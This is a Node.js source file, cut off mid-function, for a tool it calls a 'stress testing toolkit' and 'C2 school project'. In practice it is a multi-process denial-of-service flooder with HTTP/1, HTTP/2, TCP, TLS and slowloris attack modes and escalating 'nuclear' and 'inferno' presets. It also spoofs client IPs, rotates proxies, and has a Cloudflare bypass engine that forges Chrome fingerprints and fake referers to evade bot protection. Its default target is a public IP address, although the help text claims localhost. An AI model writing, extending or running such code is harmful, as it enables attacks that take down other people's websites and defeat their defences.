

const cluster = require('cluster');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const os = require('os');
const crypto = require('crypto');

// Global error handling to prevent crashes on macOS
process.on('uncaughtException', (err) => {
    console.error('[Fatal] Uncaught Exception:', err);
    // Optionally log and continue or exit gracefully
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('[Fatal] Unhandled Rejection at:', promise, 'reason:', reason);
});
const { URL } = require('url');

// Optimize event listeners limits
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

/// Command Line Options parsing
function parseArgs() {
    const args = process.argv.slice(2);

    // Preset configurations
    // NOTE: home-network-safe defaults — concurrency × workers must stay below
    // your router's NAT table size (typically 4-16k connection entries on
    // consumer routers). On Mac, ulimit defaults to 256 file descriptors per
    // process which also caps simultaneous sockets per worker.
    const presetConfigs = {
        low: {
            workers: os.cpus().length,
            concurrency: os.platform() === 'darwin' ? 20 : 40,
            rate: 50,
            autoTune: false,
            method: 'h1'
        },
        medium: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
            concurrency: os.platform() === 'darwin' ? 60 : 120,
            rate: 150,
            autoTune: true,
            method: 'h1'
        },
        high: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
            concurrency: os.platform() === 'darwin' ? 30 : 60,
            rate: 100,
            autoTune: true,
            method: 'h2'
        },
        // New extreme preset for maximum stress testing
        extreme: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 3 : 6),
            concurrency: os.platform() === 'darwin' ? 100 : 200,
            rate: 300,
            autoTune: true,
            method: 'h2'
        },
        // NUCLEAR: heavy load — only run on machines with raised ulimit (`ulimit -n 65536`)
        nuclear: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 4 : 8),
            concurrency: os.platform() === 'darwin' ? 200 : 400,
            rate: 500,
            autoTune: true,
            method: 'h2'
        },
        // INFERNO: requires raised ulimit AND a non-home network (won't survive a residential router)
        inferno: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 6 : 12),
            concurrency: os.platform() === 'darwin' ? 400 : 800,
            rate: 800,
            autoTune: true,
            method: 'h2'
        }
    };

    // Default configuration (medium preset)
    const parsed = {
        preset: 'medium', // low | medium | high
        auto: false, // enable auto preset based on platform
        aggressive: false, // enable aggressive mode for higher performance
        target: 'http://43.153.42.5:5680/hit', // default target for localhost testing
        duration: 300,
        workers: presetConfigs.medium.workers,
        method: presetConfigs.medium.method,
        // autoTune will be set based on aggressive flag after parsed object creation
        rate: presetConfigs.medium.rate,
        concurrency: presetConfigs.medium.concurrency,
        post: false,
        cookie: null,
        headers: [],
        help: false,
        maxConcurrency: null, // override concurrency per worker
        maxRps: null, // maximum requests per second per worker (optional)
        autoTune: presetConfigs.medium.autoTune,
        bypassCf: false, // enable Cloudflare bypass mode (Chrome-coherent fingerprint)
        cfJitter: 0 // optional inter-burst jitter in ms (humanizes timing) — 0 = off
    };

    // If aggressive mode is enabled, force autoTune
    if (parsed.aggressive) {
        parsed.autoTune = true;
    }

    // Parse CLI arguments
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        switch (arg) {
            case '--help':
            case '-h':
                parsed.help = true;
                break;
            case '--target':
            case '-t':
                parsed.target = args[++i];
                break;
            case '--duration':
            case '-d':
                parsed.duration = parseInt(args[++i], 10);
                break;
            case '--workers':
            case '-w':
                parsed.workers = parseInt(args[++i], 10);
                break;
            case '--method':
            case '-m':
                parsed.method = args[++i].toLowerCase();
                break;
            case '--rate':
            case '-r':
                parsed.rate = parseInt(args[++i], 10);
                break;
            case '--concurrency':
            case '-c':
                parsed.concurrency = parseInt(args[++i], 10);
                break;
            case '--max-concurrency':
                parsed.maxConcurrency = parseInt(args[++i], 10);
                break;
            case '--max-rps':
                parsed.maxRps = parseInt(args[++i], 10);
                break;
            case '--auto-tune':
                parsed.autoTune = true;
                break;
            case '--post':
            case '-p':
                parsed.post = true;
                break;
            case '--cookie':
            case '-k':
                parsed.cookie = args[++i];
                break;
            case '--header':
                parsed.headers.push(args[++i]);
                break;
            case '--preset':
                parsed.preset = args[++i];
                break;
            case '--proxy':
                // proxy in host:port format
                parsed.proxy = args[++i];
                break;
            case '--proxy-file':
                // path to file containing proxy list (one per line)
                parsed.proxyFile = args[++i];
                break;
            case '--auto':
                parsed.auto = true;
                break;
            case '--aggressive':
                parsed.aggressive = true;
                break;
            case '--bypass-cf':
                parsed.bypassCf = true;
                break;
            case '--cf-jitter':
                parsed.cfJitter = parseInt(args[++i], 10);
                break;
        }
    }
    // Load proxy list if proxyFile provided
    if (parsed.proxyFile) {
        try {
            const proxyLines = require('fs').readFileSync(parsed.proxyFile, 'utf8')
                .split(/\r?\n/)
                .filter(l => l.trim().length);
            // pick a random proxy
            const rand = Math.floor(Math.random() * proxyLines.length);
            parsed.proxy = proxyLines[rand];
        } catch (e) {
            console.error('Failed to load proxy file:', e.message);
        }
    }

    // Apply preset overrides if a valid preset is provided
    if (parsed.preset && presetConfigs[parsed.preset]) {
        const p = presetConfigs[parsed.preset];
        parsed.workers = p.workers;
        parsed.concurrency = p.concurrency;
        parsed.rate = p.rate;
        parsed.autoTune = p.autoTune;
        parsed.method = p.method;
    }
    // If auto flag is set and no preset specified, choose based on target protocol
    if (parsed.auto && !parsed.preset) {
        const isHttps = parsed.target && parsed.target.startsWith('https://');
        const selectedPreset = isHttps ? 'high' : 'low';
        const p = presetConfigs[selectedPreset];
        parsed.preset = selectedPreset;
        parsed.workers = p.workers;
        parsed.concurrency = p.concurrency;
        parsed.rate = p.rate;
        parsed.autoTune = p.autoTune;
        parsed.method = p.method;
    }

    // Override concurrency if maxConcurrency flag is used
    if (parsed.maxConcurrency !== null) {
        parsed.concurrency = parsed.maxConcurrency;
    }

    // Aggressive mode: double workers and concurrency if enabled
    if (parsed.aggressive) {
        parsed.workers *= 2;
        parsed.concurrency *= 2;
    }

    // Enforce maxRps per worker if set (cap rate)
    if (parsed.maxRps !== null && parsed.rate > parsed.maxRps) {
        parsed.rate = parsed.maxRps;
    }

    // Fallback defaults based on method (in case method was changed manually)
    if (parsed.concurrency === null) {
        switch (parsed.method) {
            case 'h1':
                parsed.concurrency = 100;
                break;
            case 'h2':
                parsed.concurrency = 50;
                break;
            case 'slow':
                parsed.concurrency = 100;
                break;
            case 'tls':
                parsed.concurrency = 70;
                break;
            case 'tcp':
                parsed.concurrency = 150;
                break;
            default:
                parsed.concurrency = 100;
        }
    }

    return parsed;
}

const config = parseArgs();

if (config.help) {
    console.log(`
╔═════════════════════════════════════════════════════════════════════════╗
║                      SIGMA STRESS TESTING TOOLKIT                       ║
║                           C2 SCHOOL PROJECT                             ║
╚═════════════════════════════════════════════════════════════════════════╝

  Usage: node sigma.js [options]
  Note: Default target is http://localhost if not specified.

Options:
  -t, --target <url>       Target website URL (e.g. https://example.com)
  -d, --duration <secs>    Simulation duration in seconds (default: 60)
  -w, --workers <num>      Number of simulation worker processes (default: CPU cores * 2)
  -m, --method <name>      Attack vector: h1, h2, h2-settings, tcp, tls, slow (default: h1)
  -r, --rate <num>         Rate multiplier / requests per loop (default: 50)
  -c, --concurrency <num>  Number of concurrent connections per worker
  -p, --post               Send POST requests with randomized payload (default: GET)
  -k, --cookie <string>    Custom cookie string to include in HTTP requests
          --header <name:value>    Custom header (can specify multiple times)
          --preset <low|medium|high|extreme|nuclear|inferno>  Choose preset configuration (default: medium)
          --auto                 Auto-select preset based on target protocol (http => low, https => high)
          --aggressive           Enable aggressive mode for higher performance (doubles workers & concurrency)
          --max-rps <num>        Cap requests per second per worker (prevents overload)
          --bypass-cf            Enable Cloudflare bypass mode (Chrome-coherent fingerprint, drops bot-tells, realistic refs/paths, CF block detection)
          --cf-jitter <ms>       Inter-burst jitter in ms when --bypass-cf is on (humanizes timing, default: 0)
          -h, --help             Display this help guide
`);
    process.exit(0);
}

// Target parsing
const targetUrl = new URL(config.target);
const HOST = targetUrl.hostname;
const PORT = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
const IS_SSL = targetUrl.protocol === 'https:';

// HTTP/TLS Coherency Browser Profiles
const PROFILES = [
    {
        name: 'chrome_win',
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        headers: {
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'chrome_mac',
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        headers: {
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'firefox_win',
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        headers: {
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.5",
            "accept-encoding": "gzip, deflate, br"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_shae256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'safari_mac',
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        headers: {
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br"
        },
        ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    }
];

function getRandomProfile() {
    return PROFILES[Math.floor(Math.random() * PROFILES.length)];
}

// Index lookup map — eliminates O(n) PROFILES.indexOf() calls in hot paths
const PROFILE_INDEX = new Map();
PROFILES.forEach((p, i) => PROFILE_INDEX.set(p, i));

// ── Cloudflare Bypass Engine ────────────────────────────────────────────────
// When --bypass-cf is active, these pools provide human-looking traffic patterns
// that avoid CF bot detection heuristics.

// Realistic referers (CF flags random hex tokens as bot traffic)
const CF_REFERER_POOL = [
    `https://www.google.com/`,
    `https://www.google.com/search?q=${HOST}&oq=${HOST}`,
    `https://www.google.com/search?q=${HOST}+review`,
    `https://www.google.com/search?q=${HOST}+login`,
    `https://www.bing.com/search?q=${HOST}`,
    `https://www.bing.com/search?q=${HOST}+site`,
    `https://search.yahoo.com/search?p=${HOST}`,
    `https://duckduckgo.com/?q=${HOST}`,
    `https://www.reddit.com/`,
    `https://www.reddit.com/r/all/`,
    `https://twitter.com/`,
    `https://x.com/`,
    `https://t.co/redirect`,
    `https://www.facebook.com/`,
    `https://l.facebook.com/l.php`,
    `https://www.linkedin.com/feed/`,
    `https://www.youtube.com/`,
    `https://${HOST}/`,
    `https://${HOST}/about`,
    `https://${HOST}/contact`,
    `https://${HOST}/login`,
    `https://${HOST}/products`,
    ``, // direct navigation (no referer)
];

// Realistic URL paths (CF flags random hex params as bot traffic)
const CF_PATH_VARIANTS = [
    '',
    '?utm_source=google&utm_medium=cpc&utm_campaign=brand',
    '?utm_source=facebook&utm_medium=social&utm_content=post',
    '?utm_source=newsletter&utm_medium=email&utm_campaign=weekly',
    '?ref=homepage',
    '?ref=nav',
    '?source=organic',
    '?gclid=CjwKCAjw-' + Math.random().toString(36).slice(2, 14),
    '?fbclid=' + Math.random().toString(36).slice(2, 26),
    '?_ga=2.' + Math.floor(Math.random() * 999999999) + '.' + Math.floor(Math.random() * 9999999999) + '.' + Date.now(),
    '?cb=' + Date.now(),
    '?v=' + Math.floor(Math.random() * 100),
    '#',
    '#top',
    '#main-content',
];

// Chrome 124 exact HTTP/2 SETTINGS fingerprint (CF checks these values)
const CF_H2_SETTINGS = {
    headerTableSize: 65536,
    enablePush: false,
    initialWindowSize: 6291456,
    maxFrameSize: 16384,
    maxHeaderListSize: 262144
};

// Extended Client Hints for each profile (CF checks presence/consistency)
const CF_CLIENT_HINTS = {
    chrome_win: {
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.91", "Google Chrome";v="124.0.6367.91", "Not-A.Brand";v="99.0.0.0"',
        'sec-ch-ua-wow64': '?0',
    },
    chrome_mac: {
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-ch-ua-platform-version': '"14.4.0"',
        'sec-ch-ua-arch': '"arm"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.91", "Google Chrome";v="124.0.6367.91", "Not-A.Brand";v="99.0.0.0"',
        'sec-ch-ua-wow64': '?0',
    },
    firefox_win: {},
    safari_mac: {},
};

// Chrome H1 header order (CF fingerprints header ordering)
const CF_H1_HEADER_ORDER = [
    'Host', 'Connection', 'Cache-Control', 'sec-ch-ua', 'sec-ch-ua-mobile',
    'sec-ch-ua-platform', 'Upgrade-Insecure-Requests', 'User-Agent', 'Accept',
    'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
    'Accept-Encoding', 'Accept-Language', 'Cookie'
];

// Simple timestamped logger for consistency
function log(msg) {
    const ts = new Date().toISOString();
    console.log(`[${ts}] ${msg}`);
}

function randomIP() {
    return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
}

// ── TLS Session Resumption Cache ─────────────────────────────────────────
// Stores the raw session ticket/ID returned by the server after the first
// full handshake. Every subsequent connection to the same host reuses it,
// skipping the expensive RSA/ECDSA key-exchange step (~10× cheaper).
const tlsSessionCache = new Map(); // HOST -> Buffer

// Helper to construct a raw direct socket connection matching a profile
function connectSocket(profile, callback) {
    const socket = net.connect({ host: HOST, port: PORT }, () => {
        // ── Ephemeral Port Protection ────────────────────────────────────
        // SO_LINGER with timeout 0 tells the kernel to abort with TCP RST
        // instead of normal FIN handshake, skipping the 60-second TIME_WAIT
        // state. Without this, a stress test exhausts the Mac's ~28k ephemeral
        // ports within ~60 seconds and the browser can't reach any site until
        // TIME_WAIT entries expire. Also dramatically reduces NAT table pressure
        // on home routers (typically 4-16k connection entries).
        try { socket.setNoDelay(true); } catch (_) { }
        try {
            // Node's net.Socket doesn't expose setLinger on the public API,
            // but the underlying libuv handle does. Wrap in try-catch since
            // private APIs can break across Node versions.
            if (socket._handle && typeof socket._handle.setLinger === 'function') {
                socket._handle.setLinger(1, 0);
            }
        } catch (_) { }

        if (!IS_SSL) {
            return callback(null, socket);
        }

        const tlsOptions = {
            socket: socket,
            servername: HOST,
            rejectUnauthorized: false,
            ALPNProtocols: (config.method === 'h2' || config.method === 'h2-settings') ? ['h2'] : ['http/1.1'],
            ciphers: profile.ciphers,
            ecdhCurve: profile.curves,
            honorCipherOrder: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            // Inject cached session ticket to skip full handshake
            session: tlsSessionCache.get(HOST) || undefined
        };

        const secureSocket = tls.connect(tlsOptions, () => {
            callback(null, secureSocket);
        });

        // Store the session ticket the moment the server sends it
        secureSocket.on('session', (sessionData) => {
            tlsSessionCache.set(HOST, sessionData);
        });

        secureSocket.on('error', (tlsErr) => {
            socket.destroy();
            callback(tlsErr);
        });
    });

    socket.on('error', (err) => {
        callback(err);
    });
}

function makeHeaders(profile, method = 'GET') {
    let path;
    let referer;

    if (config.bypassCf) {
        // Realistic path + referer from CF pools — looks like organic traffic
        const pathVariant = CF_PATH_VARIANTS[Math.floor(Math.random() * CF_PATH_VARIANTS.length)];
        path = (targetUrl.pathname || '/') + (targetUrl.search || '') + pathVariant;
        referer = CF_REFERER_POOL[Math.floor(Math.random() * CF_REFERER_POOL.length)];
    } else {
        const randomParam = crypto.randomBytes(3).toString('hex');
        const randomVal = crypto.randomBytes(6).toString('hex');
        path = targetUrl.pathname + (targetUrl.search || '') +
            (targetUrl.search ? '&' : '?') + randomParam + '=' + randomVal;
        referer = `https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}`;
    }

    const baseHeaders = {
        ":authority": HOST,
        ":scheme": IS_SSL ? 'https' : 'http',
        ":path": path,
        ":method": method,
        "user-agent": profile.ua
    };

    // Bot-tell headers — only sent when NOT in bypass mode (CF flags x-forwarded-for / x-real-ip from clients)
    if (!config.bypassCf) {
        baseHeaders["x-forwarded-for"] = randomIP();
        baseHeaders["x-real-ip"] = randomIP();
    }

    if (referer) baseHeaders["referer"] = referer;
    baseHeaders["cache-control"] = Math.random() < 0.5 ? "no-cache" : "max-age=0";

    Object.assign(baseHeaders, profile.headers);

    // Layer in extended Client Hints (Chrome 124 high-entropy hints) when bypass mode is on
    if (config.bypassCf) {
        const extras = CF_CLIENT_HINTS[profile.name];
        if (extras) Object.assign(baseHeaders, extras);
        // Chrome's HTTP/2 priority hint
        baseHeaders["priority"] = "u=0, i";
    }

    if (config.cookie) {
        baseHeaders["cookie"] = config.cookie;
    }

    if (config.headers && config.headers.length > 0) {
        config.headers.forEach(h => {
            const index = h.indexOf(':');
            if (index > -1) {
                const key = h.substring(0, index).trim().toLowerCase();
                const value = h.substring(index + 1).trim();
                baseHeaders[key] = value;
            }
        });
    }

    return baseHeaders;
}

function formatHTTP1HeaderKey(key) {
    const overrides = {
        'user-agent': 'User-Agent',
        'accept-encoding': 'Accept-Encoding',
        'accept-language': 'Accept-Language',
        'cache-control': 'Cache-Control',
        'x-forwarded-for': 'X-Forwarded-For',
        'x-real-ip': 'X-Real-IP',
        'sec-ch-ua': 'sec-ch-ua',
        'sec-ch-ua-mobile': 'sec-ch-ua-mobile',
        'sec-ch-ua-platform': 'sec-ch-ua-platform',
        'sec-fetch-dest': 'sec-fetch-dest',
        'sec-fetch-mode': 'sec-fetch-mode',
        'sec-fetch-site': 'sec-fetch-site',
        'sec-fetch-user': 'sec-fetch-user',
        'upgrade-insecure-requests': 'Upgrade-Insecure-Requests'
    };
    return overrides[key] || key.split('-').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join('-');
}

// ==========================================
// WORKER SIMULATION ENGINE
// ==========================================
if (!cluster.isMaster) {
    let requestsSent = 0;
    let errorsCount = 0;
    let connectionsEstablished = 0;
    let totalBytesSent = 0;
    let cfBlocks = 0; // CF challenges/blocks observed (403/429/503/cf-mitigated/cf-ray)

    // ── Local Network Health Circuit Breaker ──────────────────────────────
    // Watches per-second error rate. If we're getting hammered (errors > 60%
    // of requests), it means the local network is exhausting (port/NAT) or the
    // target is dropping us. Halve concurrency + rate to stop the cascade.
    // Slow recovery when errors drop back under 10%.
    const ORIGINAL_CONCURRENCY = config.concurrency;
    const ORIGINAL_RATE = config.rate;
    const CB_FLOOR_CONCURRENCY = Math.max(5, Math.floor(ORIGINAL_CONCURRENCY * 0.1));
    const CB_FLOOR_RATE = Math.max(5, Math.floor(ORIGINAL_RATE * 0.1));
    let cbHighErrorStreak = 0;
    let cbLowErrorStreak = 0;
    let cbTrips = 0; // diagnostic counter

    // Periodically send stats snapshot to master (connections is current state, not delta)
    setInterval(() => {
        const reqs = requestsSent;
        const errs = errorsCount;

        // Circuit breaker decision based on this tick's rates
        if (reqs > 50) {
            const errorRate = errs / Math.max(1, reqs + errs);
            if (errorRate > 0.60) {
                cbHighErrorStreak++;
                cbLowErrorStreak = 0;
                if (cbHighErrorStreak >= 2) {
                    // Trip — halve concurrency and rate
                    config.concurrency = Math.max(CB_FLOOR_CONCURRENCY, Math.floor(config.concurrency * 0.5));
                    config.rate = Math.max(CB_FLOOR_RATE, Math.floor(config.rate * 0.5));
                    cbTrips++;
                    cbHighErrorStreak = 0;
                }
            } else if (errorRate < 0.10) {
                cbLowErrorStreak++;
                cbHighErrorStreak = 0;
                if (cbLowErrorStreak >= 5) {
                    // Healthy — slowly recover toward original limits
                    config.concurrency = Math.min(ORIGINAL_CONCURRENCY, Math.ceil(config.concurrency * 1.25));
                    config.rate = Math.min(ORIGINAL_RATE, Math.ceil(config.rate * 1.25));
                    cbLowErrorStreak = 0;
                }
            } else {
                cbHighErrorStreak = 0;
                cbLowErrorStreak = 0;
            }
        }

        if (process.send) {
            process.send({
                type: 'metrics',
                requests: requestsSent,
                errors: errorsCount,
                connections: connectionsEstablished, // snapshot of current live connections
                bytes: totalBytesSent,
                cfBlocks: cfBlocks,
                cbTrips: cbTrips,
                effectiveConcurrency: config.concurrency,
                effectiveRate: config.rate
            });
            // Reset per-second counters only (NOT connectionsEstablished — it tracks live state)
            requestsSent = 0;
            errorsCount = 0;
            totalBytesSent = 0;
            cfBlocks = 0;
        }
    }, 1000);

    // CF block detection regex — checks first ~120 bytes of H1 response
    const CF_BLOCK_RE = /HTTP\/1\.[01] (403|429|503)|cf-mitigated:|cf-ray:|cloudflare/i;

    // ==========================================
    // GLOBAL WORKER RESOURCE ALLOCATION
    // Pre-build reusable structures once at worker startup so all flood
    // functions share the same memory rather than re-allocating per-call.
    // ==========================================

    // H1: Static header fragment shared across all sockets.
    // Two variants per profile — standard (with XFF/XRI bot signals) and CF-bypass (Chrome-coherent, no bot tells).
    // Hot path picks the right one based on config.bypassCf.
    const H1_STATIC_PROFILE_CACHE = PROFILES.map(profile => {
        let fragment = '';
        for (const [k, v] of Object.entries(profile.headers)) {
            fragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
        }
        // CF-bypass variant: include extended Client Hints in profile fragment
        let cfFragment = '';
        const extras = CF_CLIENT_HINTS[profile.name] || {};
        for (const [k, v] of Object.entries(profile.headers)) {
            cfFragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
        }
        for (const [k, v] of Object.entries(extras)) {
            cfFragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
        }
        return { ua: profile.ua, fragment, cfFragment };
    });

    // H2: Pre-generated header object pool. Workers pull by index so the hot
    // burst loop does zero string operations — pure array reads.
    const H2_POOL_SIZE = 1024;
    const H2_HEADER_POOL = (() => {
        const pool = [];
        const method = config.post ? 'POST' : 'GET';
        for (let i = 0; i < H2_POOL_SIZE; i++) {
            pool.push(makeHeaders(getRandomProfile(), method));
        }
        return pool;
    })();
    let h2PoolIndex = 0;

    // Refresh the pool in the background in 128-entry slices every 250ms
    // (1024 entries → full rotation every 2s, but no GC spike from bulk rebuild).
    const H2_REFRESH_SLICE = 128;
    let h2RefreshCursor = 0;
    setInterval(() => {
        const method = config.post ? 'POST' : 'GET';
        const end = h2RefreshCursor + H2_REFRESH_SLICE;
        for (let i = h2RefreshCursor; i < end; i++) {
            H2_HEADER_POOL[i & (H2_POOL_SIZE - 1)] = makeHeaders(getRandomProfile(), method);
        }
        h2RefreshCursor = end & (H2_POOL_SIZE - 1);
    }, 250);

    // Pre-generated random token pools — eliminate crypto.randomBytes from H1 hot loop
    const RAND_POOL_SIZE = 2048;
    const RAND_PATH_TOKENS = new Array(RAND_POOL_SIZE);
    const RAND_IP_POOL = new Array(RAND_POOL_SIZE);
    const RAND_REF_TOKENS = new Array(RAND_POOL_SIZE);
    for (let i = 0; i < RAND_POOL_SIZE; i++) {
        RAND_PATH_TOKENS[i] = [crypto.randomBytes(3).toString('hex'), crypto.randomBytes(6).toString('hex')];
        RAND_IP_POOL[i] = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
        RAND_REF_TOKENS[i] = crypto.randomBytes(4).toString('hex');
    }
    let randPoolIdx = 0;
    setInterval(() => {
        for (let i = 0; i < RAND_POOL_SIZE; i++) {
            RAND_PATH_TOKENS[i] = [crypto.randomBytes(3).toString('hex'), crypto.randomBytes(6).toString('hex')];
            RAND_IP_POOL[i] = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
            RAND_REF_TOKENS[i] = crypto.randomBytes(4).toString('hex');
        }
        randPoolIdx = 0;
    }, 10000);

    // CF bypass realistic pools — pre-sampled into 2048-entry power-of-2 arrays for O(1) bitmask access
    const CF_REF_POOL = new Array(RAND_POOL_SIZE);
    const CF_PATH_POOL = new Array(RAND_POOL_SIZE);
    const buildCfPools = () => {
        for (let i = 0; i < RAND_POOL_SIZE; i++) {
            CF_REF_POOL[i] = CF_REFERER_POOL[Math.floor(Math.random() * CF_REFERER_POOL.length)];
            const variant = CF_PATH_VARIANTS[Math.floor(Math.random() * CF_PATH_VARIANTS.length)];
            CF_PATH_POOL[i] = (targetUrl.pathname || '/') + (targetUrl.search || '') + variant;
        }
    };
    if (config.bypassCf) {
        buildCfPools();
        setInterval(buildCfPools, 15000); // refresh every 15s to vary patterns
    }

    // TCP: pre-built initial payloads per profile (eliminates string concat per socket)
    const TCP_PAYLOAD_CACHE = PROFILES.map(p =>
        `GET / HTTP/1.1\r\nHost: ${HOST}\r\nUser-Agent: ${p.ua}\r\n\r\n`
    );
    const TCP_PAYLOAD_BYTES = TCP_PAYLOAD_CACHE.map(s => Buffer.byteLength(s));

    // Slowloris: pre-built drip buffers — 16 variants, picked by bitmask, refreshed periodically
    const SLOW_DRIP_VARIANTS = 16;
    const SLOW_DRIP_BUFS = new Array(SLOW_DRIP_VARIANTS);
    const SLOW_KEEPALIVE_LINES = new Array(SLOW_DRIP_VARIANTS);
    const rebuildSlowDrip = () => {
        for (let i = 0; i < SLOW_DRIP_VARIANTS; i++) {
            SLOW_DRIP_BUFS[i] = crypto.randomBytes(4);
